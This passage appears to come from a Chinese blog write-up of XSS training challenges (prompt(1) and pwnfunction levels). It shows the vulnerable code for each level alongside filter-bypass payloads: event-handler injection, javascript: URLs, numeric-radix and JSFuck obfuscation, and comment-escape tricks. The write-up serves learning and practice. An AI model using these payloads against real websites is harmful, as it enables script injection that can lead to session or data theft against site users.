class=\"line\">执行 `中的代码,es6模板字符串</span><br><span class=\"line\"></span><br><span class=\"line\">alert(1)</span><br></pre></td></tr></table></figure>\n<p>0x11</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&quot;?;alert(1)/.</span><br></pre></td></tr></table></figure>\n<h2 id=\"prompt1\"><a class=\"markdownIt-Anchor\" href=\"#prompt1\">#</a> prompt(1)</h2>\n<p>2</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">eval.call</span><br><span class=\"line\">prompt`1`</span><br><span class=\"line\">&lt;svg&gt;&lt;script&gt;prompt&amp;#40;1)   切换命名空间</span><br><span class=\"line\">最好不要编码符号</span><br></pre></td></tr></table></figure>\n<p>5</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">aaa&quot; onerror</span><br><span class=\"line\">=&quot;prompt(1)&quot; src=111 type=&quot;image </span><br></pre></td></tr></table></figure>\n<p>6</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;form&gt;中注入</span><br><span class=\"line\">// e.g. http://httpbin.org/post#&#123;&quot;name&quot;:&quot;Matt&quot;&#125;</span><br><span class=\"line\">&lt;form action=&quot;http://httpbin.org/post&quot; method=&quot;post&quot;&gt;&lt;input name=&quot;name&quot; value=&quot;Matt&quot;&gt;&lt;/form&gt;</span><br><span class=\"line\">javascript:prompt(1)#&#123;&quot;action&quot;:&quot;Matt&quot;&#125;</span><br><span class=\"line\">&lt;form action=&quot;javascript:prompt(1)&quot; method=&quot;post&quot;&gt;&lt;input name=&quot;action&quot; value=&quot;Matt&quot;&gt;&lt;/form&gt;     </span><br><span class=\"line\">通过input action覆盖form action</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;script&gt;                                                  \\n\\</span><br><span class=\"line\">    // forbid javascript: or vbscript: and data: stuff    \\n\\</span><br><span class=\"line\">    if (!/script:|data:/i.test(document.forms[0].action)) \\n\\</span><br><span class=\"line\">        document.forms[0].submit();                       \\n\\</span><br><span class=\"line\">    else                                                  \\n\\</span><br><span class=\"line\">        document.write(&quot;Action forbidden.&quot;)               \\n\\</span><br><span class=\"line\">&lt;/script&gt;   </span><br></pre></td></tr></table></figure>\n<p>7</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&quot;&gt;&lt;script&gt;/*#*/prompt/*#*/(1)/*#*/&lt;/script&gt;</span><br><span class=\"line\">&lt;p class=&quot;comment&quot; title=&quot;&quot;&gt;&lt;script&gt;/*&quot;&gt;&lt;/p&gt;</span><br><span class=\"line\">&lt;p class=&quot;comment&quot; title=&quot;*/prompt/*&quot;&gt;&lt;/p&gt;</span><br><span class=\"line\">&lt;p class=&quot;comment&quot; title=&quot;*/(1)/*&quot;&gt;&lt;/p&gt;</span><br><span class=\"line\">&lt;p class=&quot;comment&quot; title=&quot;*/&lt;/script&gt;&quot;&gt;&lt;/p&gt;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>8</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">U+005C:反斜杠(reverse solidus)</span><br><span class=\"line\">U+000D:回车 (carriage return)</span><br><span class=\"line\">U+2028:行分隔符(line separator)</span><br><span class=\"line\">U+2029∶段分隔符(paragraph separator)</span><br><span class=\"line\">u+000A:换行符（line feed)</span><br><span class=\"line\">&#x27;\\u2028prompt(1)\\u2028--&gt;&#x27;</span><br></pre></td></tr></table></figure>\n<p>10</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">prom&#x27;pt(1)</span><br></pre></td></tr></table></figure>\n<p>11</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&quot;(prompt(1))in&quot;</span><br></pre></td></tr></table></figure>\n<p>12</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">parseInt  转为x进制数的十进制数,x范围为2-36</span><br><span class=\"line\">36 = [a-z] + [0-9]</span><br><span class=\"line\">如果第一个字符不能转为进制返回nan</span><br><span class=\"line\">p = 10+16</span><br><span class=\"line\">parseInt(&#x27;prompt&#x27;,30)</span><br><span class=\"line\">进制数必须大于30，必须要大于t的进制数 t = 10 + 20</span><br><span class=\"line\">parseInt(&#x27;p&#x27;,25)</span><br><span class=\"line\">NaN</span><br><span class=\"line\">parseInt(&#x27;p&#x27;,26)</span><br><span class=\"line\">25</span><br><span class=\"line\">parseInt(&#x27;p&#x27;,27)</span><br><span class=\"line\">25</span><br><span class=\"line\">parseInt(&#x27;p&#x27;,36)</span><br><span class=\"line\">25</span><br><span class=\"line\">parseInt(&#x27;prompt&#x27;,29)</span><br><span class=\"line\">18361375</span><br><span class=\"line\">parseInt(&#x27;prompt&#x27;,30)</span><br><span class=\"line\">630038579</span><br><span class=\"line\">18361375..toString(29)</span><br><span class=\"line\">&#x27;promp&#x27;</span><br><span class=\"line\">630038579..toString(30)</span><br><span class=\"line\">&#x27;prompt&#x27;</span><br><span class=\"line\">r是28进制数，如果27仍是p的结果</span><br><span class=\"line\"></span><br><span class=\"line\">eval(630038579..toString(30))(1)</span><br><span class=\"line\"></span><br><span class=\"line\">eval(&#x27;prompt&#x27;)</span><br><span class=\"line\">ƒ prompt() &#123; [native code] &#125;</span><br><span class=\"line\">a = eval(&#x27;prompt&#x27;)</span><br><span class=\"line\">ƒ prompt() &#123; [native code] &#125;</span><br><span class=\"line\">a(1)</span><br><span class=\"line\">&#x27;&#x27;</span><br></pre></td></tr></table></figure>\n<p>F</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">svg命名空间中使用xml语法，且xml注释和html注释一样</span><br><span class=\"line\">&quot;&gt;&lt;svg&gt;....</span><br><span class=\"line\">如果不进行命名空间切换，script无法识别html注释</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>写在最前：</p>\n<p>做 pwnfunction 时时刻注意：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1.</span><br><span class=\"line\">name = &quot;&lt;script&gt;alert(&#x27;I am John in an annoying alert!&#x27;)&lt;/script&gt;&quot;;</span><br><span class=\"line\">el.innerHTML = name; // harmless in this case</span><br><span class=\"line\">这种看似xss的方式是行不通的</span><br><span class=\"line\">HTML 5 中指定不执行由 innerHTML 插入的 &lt;script&gt; 标签。</span><br><span class=\"line\">然而，有很多不依赖 &lt;script&gt; 标签去执行 JavaScript 的方式。所以当你使用innerHTML 去设置你无法控制的字符串时，这仍然是一个安全问题。例如：</span><br><span class=\"line\">const name = &quot;&lt;img src=&#x27;x&#x27; onerror=&#x27;alert(1)&#x27;&gt;&quot;;</span><br><span class=\"line\">el.innerHTML = name; // shows the alert</span><br><span class=\"line\">Copy to Clipboard</span><br><span class=\"line\">基于这个原因，当插入纯文本时，建议不要使用 innerHTML 。取而代之的是使用 Node.textContent ，它不会把给定的内容解析为 HTML，它仅仅是将原始文本插入给定的位置。</span><br><span class=\"line\"></span><br><span class=\"line\">2.</span><br><span class=\"line\"> 如果一个 &lt;div&gt;, &lt;span&gt;, 或 &lt;noembed&gt; 节点有一个文本子节点，该节点包含字符 (&amp;), (&lt;), 或 (&gt;), innerHTML 将这些字符分别返回为 &amp;amp;, &amp;lt; 和 &amp;gt;。使用Node.textContent 可获取一个这些文本节点内容的正确副本。</span><br></pre></td></tr></table></figure>\n<h2 id=\"ma-spaghet\"><a class=\"markdownIt-Anchor\" href=\"#ma-spaghet\">#</a> Ma Spaghet</h2>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">somebody = &lt;script&gt;alert(1)&lt;/script&gt;</span><br><span class=\"line\">尽管这看上去像cross-site scripting攻击，结果并不会导致什么。HTML 5中指定不执行由innerHTML插入的&lt;script&gt;标签。</span><br><span class=\"line\">然而，有很多不依赖&lt;script&gt;标签去执行JavaScript的方式。所以当你使用innerHTML去设置你无法控制的字符串时，这仍然是一个安全问题。例如:&lt;img&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;h2 id=&quot;spaghet&quot;&gt;&lt;/h2&gt;</span><br><span class=\"line\">&lt;script&gt;</span><br><span class=\"line\">    spaghet.innerHTML = (new URL(location).searchParams.get(&#x27;somebody&#x27;) || &quot;Somebody&quot;) + &quot; Toucha Ma Spaghet!&quot;</span><br><span class=\"line\">&lt;/script&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;svg onload=alert(1337)&gt;</span><br></pre></td></tr></table></figure>\n<h2 id=\"jefff\"><a class=\"markdownIt-Anchor\" href=\"#jefff\">#</a> Jefff</h2>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9kZXZlbG9wZXIubW96aWxsYS5vcmcvemgtQ04vZG9jcy9XZWIvSmF2YVNjcmlwdC9SZWZlcmVuY2UvR2xvYmFsX09iamVjdHMvZXZhbA==\">eval() - JavaScript | MDN (mozilla.org)</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9zb3VyY2VncmFwaC5jb20vZ2l0aHViLmNvbS93YW5nZG9jL2phdmFzY3JpcHQtdHV0b3JpYWwvLS9ibG9iL2RvY3MvdHlwZXMvZnVuY3Rpb24ubWQ=\">function.md - wangdoc/javascript-tutorial - Sourcegraph</span></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;h2 id=&quot;maname&quot;&gt;&lt;/h2&gt;</span><br><span class=\"line\">&lt;script&gt;</span><br><span class=\"line\">    let jeff = (new URL(location).searchParams.get(&#x27;jeff&#x27;) || &quot;JEFFF&quot;)</span><br><span class=\"line\">    let ma = &quot;&quot;</span><br><span class=\"line\">    eval(`ma = &quot;Ma name $&#123;jeff&#125;&quot;`)</span><br><span class=\"line\">    setTimeout(_ =&gt; &#123;</span><br><span class=\"line\">        maname.innerText = ma</span><br><span class=\"line\">    &#125;, 1000)</span><br><span class=\"line\">&lt;/script&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">eval([&quot;&quot;,&quot;&quot;],prompt(1))</span><br><span class=\"line\">(2) [&#x27;&#x27;, &#x27;&#x27;]</span><br><span class=\"line\">eval([&quot;&quot;,&quot;&quot;],&#x27;aaaaa&#x27;)</span><br><span class=\"line\">(2) [&#x27;&#x27;, &#x27;&#x27;]</span><br><span class=\"line\">//eval没有tostring方法，会返回数组形式的第一个参数</span><br><span class=\"line\">如果eval的参数不是字符串，那么会原样返回。</span><br><span class=\"line\"></span><br><span class=\"line\">1&quot;;alert(1)//</span><br><span class=\"line\">1&quot;,alert(1)//</span><br><span class=\"line\">jeff=&quot;-alert(1)-&quot;</span><br><span class=\"line\">在js中-两边都是表达式，则可以执行代码</span><br><span class=\"line\">先闭合Ma name 1&quot; 再用,或者;分割作为eval第二个参数，实现上面那个例子的弹窗</span><br></pre></td></tr></table></figure>\n<h2 id=\"da-wey\"><a class=\"markdownIt-Anchor\" href=\"#da-wey\">#</a> da-wey</h2>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;div id=&quot;uganda&quot;&gt;&lt;/div&gt;</span><br><span class=\"line\">&lt;script&gt;</span><br><span class=\"line\">    let wey = (new URL(location).searchParams.get(&#x27;wey&#x27;) || &quot;do you know da wey?&quot;);</span><br><span class=\"line\">    wey = wey.replace(/[&lt;&gt;]/g, &#x27;&#x27;)</span><br><span class=\"line\">    uganda.innerHTML = `&lt;input type=&quot;text&quot; placeholder=&quot;$&#123;wey&#125;&quot; class=&quot;form-control&quot;&gt;`</span><br><span class=\"line\">&lt;/script&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">?wey=1&quot; onfocus=alert(1) autofocus//</span><br></pre></td></tr></table></figure>\n<h2 id=\"ricardo\"><a class=\"markdownIt-Anchor\" href=\"#ricardo\">#</a> ricardo</h2>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;form id=&quot;ricardo&quot; method=&quot;GET&quot;&gt;</span><br><span class=\"line\">    &lt;input name=&quot;milos&quot; type=&quot;text&quot; class=&quot;form-control&quot; placeholder=&quot;True&quot; value=&quot;True&quot;&gt;</span><br><span class=\"line\">&lt;/form&gt;</span><br><span class=\"line\">&lt;script&gt;</span><br><span class=\"line\">    ricardo.action = (new URL(location).searchParams.get(&#x27;ricardo&#x27;) || &#x27;#&#x27;)</span><br><span class=\"line\">    setTimeout(_ =&gt; &#123;</span><br><span class=\"line\">        ricardo.submit()</span><br><span class=\"line\">    &#125;, 2000)</span><br><span class=\"line\">&lt;/script&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">ricardo=javascript:alert(1)</span><br><span class=\"line\"></span><br><span class=\"line\">效果类似于这样:</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;form id=&quot;ricardo&quot; method=&quot;GET&quot; action=&quot;javascript:alert(1)&quot;&gt;</span><br><span class=\"line\">    &lt;input name=&quot;milos&quot; type=&quot;text&quot; class=&quot;form-control&quot; placeholder=&quot;True&quot; value=&quot;True&quot;&gt;</span><br><span class=\"line\">    &lt;input type=&quot;submit&quot; value=&quot;submit&quot;&gt;</span><br><span class=\"line\">&lt;/form&gt;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h2 id=\"ah-thats-hawt\"><a class=\"markdownIt-Anchor\" href=\"#ah-thats-hawt\">#</a> Ah That’s Hawt</h2>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;h2 id=&quot;will&quot;&gt;&lt;/h2&gt;</span><br><span class=\"line\">&lt;script&gt;</span><br><span class=\"line\">    smith = (new URL(location).searchParams.get(&#x27;markassbrownlee&#x27;) || &quot;Ah That&#x27;s Hawt&quot;)</span><br><span class=\"line\">    smith = smith.replace(/[\\(\\`\\)\\\\]/g, &#x27;&#x27;)</span><br><span class=\"line\">    will.innerHTML = smith</span><br><span class=\"line\">&lt;/script&gt;</span><br><span class=\"line\">过滤了()`\\  </span><br><span class=\"line\">先html实体，在url编码</span><br><span class=\"line\">或者两次url编码</span><br><span class=\"line\">payload:</span><br><span class=\"line\">markassbrownlee=&lt;img%20src=1%20onerror=alert%26%2340%3B1%26%2341%3B&gt;</span><br><span class=\"line\">markassbrownlee=&lt;a href=&quot;javascript:alert%25281%2529&quot;&gt;a </span><br><span class=\"line\">markassbrownlee=%3Csvg%20onload%3D%22%26%23x61%3B%26%23x6C%3B%26%23x65%3B%26%23x72%3B%26%23x74%3B%26%23x28%3B%26%23x31%3B%26%23x33%3B%26%23x33%3B%26%23x37%3B%26%23x29%3B%22%3E  //两次编码svg中的alert1</span><br><span class=\"line\">href中js可以解析url编码,%28 %29</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h2 id=\"ligma\"><a class=\"markdownIt-Anchor\" href=\"#ligma\">#</a> Ligma</h2>\n<p><span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5qc2Z1Y2suY29tLw==\">http://www.jsfuck.com/</span></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">balls = (new URL(location).searchParams.get(&#x27;balls&#x27;) || &quot;Ninja has Ligma&quot;)</span><br><span class=\"line\">balls = balls.replace(/[A-Za-z0-9]/g, &#x27;&#x27;)</span><br><span class=\"line\">eval(balls)</span><br><span class=\"line\">jsfuck 注意编码，url中需要使用URL编码</span><br><span class=\"line\"></span><br><span class=\"line\">false       =&gt;  ![]</span><br><span class=\"line\">true        =&gt;  !![]</span><br><span class=\"line\">undefined   =&gt;  [][[]]</span><br><span class=\"line\">NaN         =&gt;  +[![]]</span><br><span class=\"line\">0           =&gt;  +[]</span><br><span class=\"line\">1           =&gt;  +!+[]</span><br><span class=\"line\">2           =&gt;  !+[]+!+[]</span><br><span class=\"line\">10          =&gt;  [+!+[]]+[+[]]</span><br><span class=\"line\">Array       =&gt;  []</span><br><span class=\"line\">Number      =&gt;  +[]</span><br><span class=\"line\">String      =&gt;  []+[]</span><br><span class=\"line\">Boolean     =&gt;  ![]</span><br><span class=\"line\">Function    =&gt;  [][&quot;filter&quot;]</span><br><span class=\"line\">eval        =&gt;  [][&quot;filter&quot;][&quot;constructor&quot;]( CODE )()</span><br><span class=\"line\">window      =&gt;  [][&quot;filter&quot;][&quot;constructor&quot;](&quot;return this&quot;)()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h2 id=\"mafia\"><a class=\"markdownIt-Anchor\" href=\"#mafia\">#</a> mafia</h2>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mafia = (new URL(location).searchParams.get(&#x27;mafia&#x27;) || &#x27;1+1&#x27;)</span><br><span class=\"line\">mafia = mafia.slice(0, 50)</span><br><span class=\"line\">mafia = mafia.replace(/[\\`\\&#x27;\\&quot;\\+\\-\\!\\\\\\[\\]]/gi, &#x27;_&#x27;)</span><br><span class=\"line\">mafia = mafia.replace(/alert/g, &#x27;_&#x27;)</span><br><span class=\"line\">eval(mafia)</span><br><span class=\"line\"></span><br><span class=\"line\">payload1:</span><br><span class=\"line\">eval(17795081..toString(36))(1)</span><br><span class=\"line\">原理：</span><br><span class=\"line\">17795081是parseInt(&quot;alert&quot;, 36);的结果，即先把alert转为进制数，在使用..toString转回来</span><br><span class=\"line\">parseInt(&quot;&quot;, ); 解析一个字符串并返回指定基数的十进制整数， radix 是2-36之间的整数，表示被解析字符串的基数。</span><br><span class=\"line\">36 = 10 + 26    10个数字+26个字母</span><br><span class=\"line\">alert中最大的是t，进制数为30，因此必须使用&gt;=30的进制数才能表示t</span><br><span class=\"line\">转换时使用thatNumber.toString(radix)函数。</span><br><span class=\"line\">前一篇prompt(1)详细解释过了</span><br><span class=\"line\"></span><br><span class=\"line\">payload2:</span><br><span class=\"line\">eval(location.hash.slice(1))</span><br><span class=\"line\">eval(location.hash.slice(1))#alert(1)</span><br><span class=\"line\">但这种方式需要user interaction</span><br><span class=\"line\">原理：</span><br><span class=\"line\">url.href = &#x27;https://developer.mozilla.org/en-US/search?q=URL#search-results-close-container&#x27;;</span><br><span class=\"line\">console.log(url.hash);      // #search-results-close-container</span><br><span class=\"line\"></span><br><span class=\"line\">payload3：</span><br><span class=\"line\">Function(/ALERT(1337)/.source.toLowerCase())()</span><br><span class=\"line\">利用构造函数</span><br></pre></td></tr></table></figure>\n<h2 id=\"area-51\"><a class=\"markdownIt-Anchor\" href=\"#area-51\">#</a> Area 51</h2>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;div id=&quot;pwnme&quot;&gt;&lt;/div&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;script&gt;</span><br><span class=\"line\">    var input = (new URL(location).searchParams.get(&#x27;debug&#x27;) || &#x27;&#x27;).replace(/[\\!\\-\\/\\#\\&amp;\\;\\%]/g, &#x27;_&#x27;);</span><br><span class=\"line\">    var template = document.createElement(&#x27;template&#x27;);</span><br><span class=\"line\">    template.innerHTML = input;</span><br><span class=\"line\">    pwnme.innerHTML = &quot;&lt;!-- &lt;p&gt; DEBUG: &quot; + template.outerHTML + &quot; &lt;/p&gt; --&gt;&quot;;</span><br><span class=\"line\">&lt;/script&gt;</span><br><span class=\"line\">分析：过滤 !-/#&amp;;% 全部被替换为_</span><br><span class=\"line\"></span><br><span class=\"line\">payload:</span><br><span class=\"line\">&lt;?&gt;&lt;svg onload=alert(1)&gt;</span><br><span class=\"line\">&lt;?&gt;&lt;img src=1 onerror=alert(1)&gt;</span><br><span class=\"line\">&lt;?&gt;&lt;a href=javascript:alert(1)&gt;aaa</span><br><span class=\"line\">只要能闭合注释，后面的基本除了script标签之外可以乱写</span><br><span class=\"line\">    </span><br><span class=\"line\">如果直接闭合，--会被替换，&gt;会被innerhtml转义</span><br><span class=\"line\">&lt;!-- &lt;p&gt; DEBUG: &lt;template&gt;__&amp;gt;&lt;/template&gt; &lt;/p&gt; --&gt;</span><br><span class=\"line\">    </span><br><span class=\"line\">&lt;!-- --&gt;是多行注释，换行也不行，换行效果： ?debug=%0a&lt;svg/onload=alert(1)&gt;</span><br><span class=\"line\">&lt;!-- &lt;p&gt; DEBUG: &lt;template&gt;</span><br><span class=\"line\">&lt;svg_onload=alert(1)&gt;&lt;/svg_onload=alert(1)&gt;&lt;/template&gt; &lt;/p&gt; --&gt;</span><br><span class=\"line\">    </span><br><span class=\"line\">但如果输入&lt;?&gt;  ?debug=&lt;?&gt;aaaaaaaaaaa</span><br><span class=\"line\">&lt;!-- &lt;p&gt; DEBUG: &lt;template&gt;&lt;!--?--&gt;</span><br><span class=\"line\">aaaaaaaaaaa</span><br><span class=\"line\">&lt;p&gt;&lt;/p&gt; </span><br><span class=\"line\">--&amp;gt;</span><br><span class=\"line\">注释被闭合了，注释后面输入的内容可以逃逸出来</span><br><span class=\"line\">    </span><br><span class=\"line\">在template.innerHTML = input的时候，会解析input，然后使用 HTML parser 解析，根据 W3 文档</span><br><span class=\"line\">解析到&lt;的时候，HTML parser 正处于 [data state]</span><br><span class=\"line\">下一个字符是?，根据文档，HTML parser 会创建一个空的 comment token，进入 [bogus comment state]</span><br><span class=\"line\">下一个字符是 anything else，会将这个字符插入到刚刚的 comment 中，也就是我们上图看到的&lt;!--?--&gt; </span><br><span class=\"line\">例如输入是aaa&lt;?bbb&gt;ccc的时候，解析到第 i 个字符时，innerHTML 的结果是这样的</span><br><span class=\"line\">a</span><br><span class=\"line\">aa</span><br><span class=\"line\">aaa</span><br><span class=\"line\">aaa&lt;</span><br><span class=\"line\">aaa&lt;!--?--&gt;</span><br><span 